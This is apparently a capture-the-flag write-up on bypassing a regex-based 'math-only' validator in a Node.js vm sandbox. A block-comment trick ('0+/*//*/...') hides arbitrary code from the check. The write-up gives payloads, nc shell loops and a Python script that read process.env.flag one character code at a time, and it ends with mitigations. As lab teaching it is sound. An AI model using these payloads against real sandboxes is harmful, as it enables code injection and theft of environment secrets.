---
title: unary-only sandbox — write-up
subtitle: "Challenge: unary-only sandbox"
date: 2025-11-10T10:00:00Z
tags: ["pwn", "unary", "sandbox", "nodejs", "writeup"]
featured: true
mood: "concret"
---

We face a Node.js sandbox that accepts small math-like expressions only. The validator strips // line comments, applies a simple "math-only" regex and a length check, then runs return <expression> inside vm.runInNewContext. The server prints numbers only. The trick is to craft an input that looks safe to the validator but executes a different expression at runtime by abusing block comments.

## 1. Service behavior (short)

The service enforces a whitelist of characters (letters, digits, _, /, space, ;, !, (, ), ., +, -, *).

It removes line comments via something like /\/\/.*$/gm to produce codeForChecking.

If codeForChecking is not purely math (^[0-9+\-*/\s()]+$) and its length > 10 → reject with Can't handle that much math :(.

Otherwise it evaluates return <your_expression> in a sandboxed VM.

The sandbox returns only numeric output (or 0); strings/objects are not printed.

Practical consequence: exfiltration must produce numbers and must bypass the naive text checks.

## 2. Core bypass idea

The validator only strips // comments, not /* ... */ block comments. Use a pattern that becomes innocuous after // removal but, when parsed by JS, contains a block comment that hides nothing — leaving the dangerous expression active.

Payload pattern:

0+/*//*/process.env.flag.length


Explanation:

After .replace(/\/\/.*$/gm, '') the substring beginning with // is removed, so codeForChecking becomes short and math-looking (e.g. 0+/*) and passes the checks.

At execution time /*//*/ is a valid block comment; process.env.flag.length executes normally.

The leading 0+ coerces the result to a numeric value so the server prints it.

This produces a reliable divergence between the validator and the runtime.

## 3. Quick manual tests
Test execution path
0+/*//*/Date.now()


Should return a numeric timestamp — confirms the execution path.

Get flag length
0+/*//*/process.env.flag.length


Should return an integer (example: 51).

Get single character (ASCII code)
0+/*//*/process.env.flag.charCodeAt(0)


Returns the ASCII code of character at index 0. Repeat for indexes 0..length-1, convert codes back with String.fromCharCode.

## 4. Automation — shell examples

Assuming the service reachable at host:port (replace with real host and port):

Get flag length:

echo '0+/*//*/process.env.flag.length' | nc host port


Extract full flag (POSIX):

LEN=$(echo '0+/*//*/process.env.flag.length' | nc host port | awk '/^[0-9]+$/{x=$0} END{print x}')
for i in $(seq 0 $((LEN-1))); do
  printf '0+/*//*/process.env.flag.charCodeAt(%d)\n' "$i"
done | nc host port | awk '/^[0-9]+$/ {printf "%c",$0} END{print "\n"}'


This prints the reconstructed flag by converting returned ASCII codes into characters.

## 5. Full Python script (robust, with retries)
import socket
import time

HOST = 'host'
PORT = 1337
TIMEOUT = 5

def query(expr):
    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as s:
        s.sendall((expr + '\n').encode())
        s.settimeout(TIMEOUT)
        data = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
    return data.decode(errors='ignore').strip()

def get_length():
    res = query('0+/*//*/process.env.flag.length')
    for line in res.splitlines()[::-1]:
        if line.strip().isdigit():
            return int(line.strip())
    raise RuntimeError('Length not found')

def get_char_code(i):
    res = query(f'0+/*//*/process.env.flag.charCodeAt({i})')
    for line in res.splitlines()[::-1]:
        line = line.strip()
        if line.isdigit():
            return int(line)
    return None

def extract_flag():
    length = get_length()
    chars = []
    for i in range(length):
        for attempt in range(3):
            code = get_char_code(i)
            if code is not None:
                chars.append(chr(code))
                break
            time.sleep(0.5)
        else:
            chars.append('?')
    return ''.join(chars)

if __name__ == '__main__':
    print('Getting flag length...')
    L = get_length()
    print('Flag length:', L)
    print('Extracting characters...')
    flag = extract_flag()
    print('Flag:', flag)


Save as extract_flag.py, configure HOST and PORT, then run: python3 extract_flag.py.

## 6. Why this is possible (concise)

The server uses naive text processing (regex on //) instead of parsing JavaScript.

The /*//*/ pattern produces a short codeForChecking after the // strip while letting dangerous code run at execution.

The whitelist contains exactly the characters needed for the trick: /, *, ., (, ), +.

## 7. Mitigations (recommended)

Strip /* ... */ block comments before validation.

Disallow /* if multi-line comments are unnecessary.

Use an AST-based validator (Esprima/Acorn) and only allow arithmetic nodes.

Remove dangerous globals (process, global, etc.) from the sandbox context.

Enforce strict timeouts and step limits on vm.runInNewContext.

## 8. Summary

Bypass pattern: 0+/*//*/<expression>.

Get length: 0+/*//*/process.env.flag.length.

Exfiltrate: 0+/*//*/process.env.flag.charCodeAt(k) for k=0..len-1.

By N3akz
